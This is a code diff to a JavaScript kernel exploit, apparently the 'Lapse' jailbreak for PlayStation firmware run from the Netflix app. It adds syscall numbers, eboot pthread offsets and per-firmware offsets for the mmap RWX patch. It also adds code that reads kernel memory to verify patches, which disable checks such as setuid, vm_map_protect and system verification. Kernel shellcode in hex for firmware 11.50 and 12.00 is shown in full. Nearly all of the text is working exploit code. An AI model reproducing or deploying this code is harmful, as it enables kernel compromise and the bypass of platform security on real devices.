@@ -46,6 +46,7 @@ SYSCALL.unlink = 0xAn;              // 10
 SYSCALL.pipe = 42n;                 // 42
 SYSCALL.getpid = 20n;               // 20
 SYSCALL.getuid = 0x18n;             // 24
+SYSCALL.kill = 37n;                 // 37
 SYSCALL.connect = 98n;              // 98
 SYSCALL.munmap = 0x49n;             // 73
 SYSCALL.mprotect = 0x4An;           // 74
@@ -61,6 +62,7 @@ SYSCALL.mmap = 477n;                // 477
 SYSCALL.cpuset_getaffinity = 0x1E7n; // 487
 SYSCALL.cpuset_setaffinity = 0x1E8n; // 488
 SYSCALL.jitshm_create = 0x215n;     // 533
+SYSCALL.jitshm_alias = 0x216n;      // 534
 SYSCALL.evf_create = 0x21An;        // 538
 SYSCALL.evf_delete = 0x21Bn;        // 539
 SYSCALL.evf_set = 0x220n;           // 544
@@ -78,6 +80,18 @@ SYSCALL.kexec = 0x295n;             // 661
 
 MAIN_CORE = 4;  // Same as yarpe
 MAIN_RTPRIO = 0x100;
+
+// pthread_create offsets in eboot (for spawning threads)
+// USA offset: 0x2c909a, EU/JP offset: 0x25ddba
+var PTHREAD_CREATE_OFFSET_USA = 0x2c909an;
+var PTHREAD_CREATE_OFFSET_EU = 0x25ddban;
+var PTHREAD_CREATE_OFFSET_JP = 0x25ddban;  // Same as EU
+
+// pthread_join offsets in eboot (for waiting on threads)
+// USA offset: 0x2c9322, EU/JP offset: 0x25e042
+var PTHREAD_JOIN_OFFSET_USA = 0x2c9322n;
+var PTHREAD_JOIN_OFFSET_EU = 0x25e042n;
+var PTHREAD_JOIN_OFFSET_JP = 0x25e042n;  // Same as EU
 NUM_WORKERS = 2;
 NUM_GROOMS = 0x200;
 NUM_HANDLES = 0x100;
@@ -162,6 +176,33 @@ const kpatch_shellcode = {
     "11.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
     "12.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
 };
+
+// Mmap RWX patch offsets per firmware (for verification)
+// These are the offsets where 0x33 is patched to 0x37
+const kpatch_mmap_offsets = {
+    "9.00": [0x156326a, 0x156326d],  // TODO: verify
+    "9.03": [0x156262a, 0x156262d],  // TODO: verify
+    "9.50": [0x122d7a, 0x122d7d],    // TODO: verify
+    "10.00": [0xed59a, 0xed59d],     // TODO: verify
+    "10.50": [0x19c42a, 0x19c42d],   // TODO: verify
+    "11.00": [0x15626a, 0x15626d],
+    "11.02": [0x15628a, 0x15628d],
+    "11.50": [0x1fa63a, 0x1fa63d],
+    "12.00": [0x1fa71a, 0x1fa71d],
+};
+
+function get_mmap_patch_offsets(fw_version) {
+    // Normalize version
+    let lookup = fw_version;
+    if (fw_version === "9.04") lookup = "9.03";
+    else if (fw_version === "9.51" || fw_version === "9.60") lookup = "9.50";
+    else if (fw_version === "10.01") lookup = "10.00";
+    else if (fw_version === "10.70" || fw_version === "10.71") lookup = "10.50";
+    else if (fw_version === "11.52") lookup = "11.50";
+    else if (fw_version === "12.02") lookup = "12.00";
+
+    return kpatch_mmap_offsets[lookup] || null;
+}
 
 // Helper to convert hex string to byte array
 function hexToBytes(hex) {
@@ -977,6 +1018,75 @@ function apply_kernel_patches(fw_version) {
         logger.flush();
         const kexec_result = syscall(SYSCALL.kexec, mapping_addr);
         logger.log("kexec returned: " + hex(kexec_result));
+
+        // === Verify 12.00 kernel patches ===
+        if (fw_version === "12.00" || fw_version === "12.02") {
+            logger.log("Verifying 12.00 kernel patches...");
+            let patch_errors = 0;
+
+            // Patch offsets and expected values for 12.00
+            const patches_to_verify = [
+                { off: 0x1b76a3n, exp: 0x04eb, name: "dlsym_check1", size: 2 },
+                { off: 0x1b76b3n, exp: 0x04eb, name: "dlsym_check2", size: 2 },
+                { off: 0x1b76d3n, exp: 0xe990, name: "dlsym_check3", size: 2 },
+                { off: 0x627af4n, exp: 0x00eb, name: "veriPatch", size: 2 },
+                { off: 0xacdn, exp: 0xeb, name: "bcopy", size: 1 },
+                { off: 0x2bd3cdn, exp: 0xeb, name: "bzero", size: 1 },
+                { off: 0x2bd411n, exp: 0xeb, name: "pagezero", size: 1 },
+                { off: 0x2bd48dn, exp: 0xeb, name: "memcpy", size: 1 },
+                { off: 0x2bd4d1n, exp: 0xeb, name: "pagecopy", size: 1 },
+                { off: 0x2bd67dn, exp: 0xeb, name: "copyin", size: 1 },
+                { off: 0x2bdb2dn, exp: 0xeb, name: "copyinstr", size: 1 },
+                { off: 0x2bdbfdn, exp: 0xeb, name: "copystr", size: 1 },
+                { off: 0x6283dfn, exp: 0x00eb, name: "sysVeri_suspend", size: 2 },
+                { off: 0x490n, exp: 0x00, name: "syscall_check", size: 4 },
+                { off: 0x4c2n, exp: 0xeb, name: "syscall_jmp1", size: 1 },
+                { off: 0x4b9n, exp: 0x00eb, name: "syscall_jmp2", size: 2 },
+                { off: 0x4b5n, exp: 0x00eb, name: "syscall_jmp3", size: 2 },
+                { off: 0x3914e6n, exp: 0xeb, name: "setuid", size: 1 },
+                { off: 0x2fc0ecn, exp: 0x04eb, name: "vm_map_protect", size: 2 },
+                { off: 0x1b7164n, exp: 0xe990, name: "dynlib_load_prx", size: 2 },
+                { off: 0x1fa71an, exp: 0x37, name: "mmap_rwx1", size: 1 },
+                { off: 0x1fa71dn, exp: 0x37, name: "mmap_rwx2", size: 1 },
+                { off: 0x1102d80n, exp: 0x02, name: "sysent11_narg", size: 4 },
+                { off: 0x1102dacn, exp: 0x01, name: "sysent11_thrcnt", size: 4 },
+            ];
+
+            for (const p of patches_to_verify) {
+                let actual;
+                if (p.size === 1) {
+                    actual = Number(kernel.read_byte(kernel.addr.base + p.off));
+                } else if (p.size === 2) {
+                    actual = Number(kernel.read_word(kernel.addr.base + p.off));
+                } else {
+                    actual = Number(kernel.read_dword(kernel.addr.base + p.off));
+                }
+
+                if (actual === p.exp) {
+                    logger.log("  [OK] " + p.name);
+                } else {
+                    logger.log("  [FAIL] " + p.name + ": expected " + hex(p.exp) + ", got " + hex(actual));
+                    patch_errors++;
+                }
+            }
+
+            // Special check for sysent[11] sy_call - should point to jmp [rsi] gadget
+            const sysent11_call = kernel.read_qword(kernel.addr.base + 0x1102d88n);
+            const expected_gadget = kernel.addr.base + 0x47b31n;
+            if (sysent11_call === expected_gadget) {
+                logger.log("  [OK] sysent11_call -> jmp_rsi @ " + hex(sysent11_call));
+            } else {
+                logger.log("  [FAIL] sysent11_call: expected " + hex(expected_gadget) + ", got " + hex(sysent11_call));
+                patch_errors++;
+            }
+
+            if (patch_errors === 0) {
+                logger.log("All 12.00 kernel patches verified OK!");
+            } else {
+                logger.log("[WARNING] " + patch_errors + " kernel patches failed!");
+            }
+            logger.flush();
+        }
 
         // Restore original sysent[661]
         logger.log("Restoring sysent[661]...");
@@ -2570,6 +2680,50 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
         const kpatch_result = apply_kernel_patches(FW_VERSION);
         if (kpatch_result) {
             logger.log("Kernel patches applied successfully!");
+
+            // Comprehensive kernel patch verification
+            logger.log("Verifying kernel patches...");
+            let all_patches_ok = true;
+
+            // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
+            const mmap_offsets = get_mmap_patch_offsets(FW_VERSION);
+            if (mmap_offsets) {
+                const byte1 = Number(ipv6_kernel_rw.ipv6_kread8(kernel.addr.base + BigInt(mmap_offsets[0])) & 0xffn);
+                const byte2 = Number(ipv6_kernel_rw.ipv6_kread8(kernel.addr.base + BigInt(mmap_offsets[1])) & 0xffn);
+                if (byte1 === 0x37 && byte2 === 0x37) {
+                    logger.log("  [OK] mmap RWX patch");
+                } else {
+                    logger.log("  [FAIL] mmap RWX: [" + hex(mmap_offsets[0]) + "]=" + hex(byte1) + " [" + hex(mmap_offsets[1]) + "]=" + hex(byte2));
+                    all_patches_ok = false;
+                }
+            } else {
+                logger.log("  [SKIP] mmap RWX (no offsets for FW " + FW_VERSION + ")");
+            }
+
+            // 2. Test mmap RWX actually works by trying to allocate RWX memory
+            try {
+                const PROT_RWX = 0x7n;  // READ | WRITE | EXEC
+                const MAP_ANON = 0x1000n;
+                const MAP_PRIVATE = 0x2n;
+                const test_addr = syscall(SYSCALL.mmap, 0n, 0x1000n, PROT_RWX, MAP_PRIVATE | MAP_ANON, 0xffffffffffffffffn, 0n);
+                if (test_addr < 0xffff800000000000n) {
+                    logger.log("  [OK] mmap RWX functional @ " + hex(test_addr));
+                    // Unmap the test allocation
+                    syscall(SYSCALL.munmap, test_addr, 0x1000n);
+                } else {
+                    logger.log("  [FAIL] mmap RWX functional: " + hex(test_addr));
+                    all_patches_ok = false;
+                }
+            } catch (e) {
+                logger.log("  [FAIL] mmap RWX test error: " + e.message);
+                all_patches_ok = false;
+            }
+
+            if (all_patches_ok) {
+                logger.log("All kernel patches verified OK!");
+            } else {
+                logger.log("[WARNING] Some kernel patches may have failed");
+            }
         } else {
             logger.log("[WARNING] Kernel patches failed - continuing without patches");
         }
@@ -2592,5 +2746,48 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
         logger.flush();
         send_notification("Lapse: ERROR - " + e.message);
     }
+
+    // =========================================================
+    // Cleanup: Close exploit resources (like yarpe's finally block)
+    // This is critical for Netflix to exit cleanly
+    // =========================================================
+    logger.log("Cleaning up exploit resources...");
+
+    // Close block/unblock socket pair
+    if (block_fd !== 0xffffffffffffffffn) {
+        syscall(SYSCALL.close, block_fd);
+    }
+    if (unblock_fd !== 0xffffffffffffffffn) {
+        syscall(SYSCALL.close, unblock_fd);
+    }
+
+    // Close all sds sockets
+    if (sds !== null) {
+        for (let i = 0; i < sds.length; i++) {
+            if (sds[i] !== 0xffffffffffffffffn) {
+                syscall(SYSCALL.close, sds[i]);
+            }
+        }
+    }
+
+    // Close all sds_alt sockets
+    if (sds_alt !== null) {
+        for (let i = 0; i < sds_alt.length; i++) {
+            if (sds_alt[i] !== 0xffffffffffffffffn) {
+                syscall(SYSCALL.close, sds_alt[i]);
+            }
+        }
+    }
+
+    // Restore CPU core and rtprio
+    if (prev_core !== -1) {
+        pin_to_core(prev_core);
+    }
+    if (prev_rtprio !== 0n) {
+        set_rtprio(prev_rtprio);
+    }
+
+    logger.log("Exploit cleanup complete");
+    logger.flush();
 })();
 
